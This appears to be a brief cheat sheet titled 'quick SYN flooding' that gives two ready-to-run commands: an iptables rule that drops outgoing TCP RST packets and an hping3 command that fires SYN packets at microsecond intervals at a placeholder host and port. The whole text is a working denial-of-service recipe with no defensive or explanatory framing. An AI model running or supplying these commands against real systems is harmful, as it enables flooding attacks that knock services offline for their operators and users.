# quick SYN flooding
Temporary drop all the sent RST requests
```bash
iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
```
Send SYN packets separated by u1 interval
```bash
hping3 -i u1 -S -p <port> <host>
```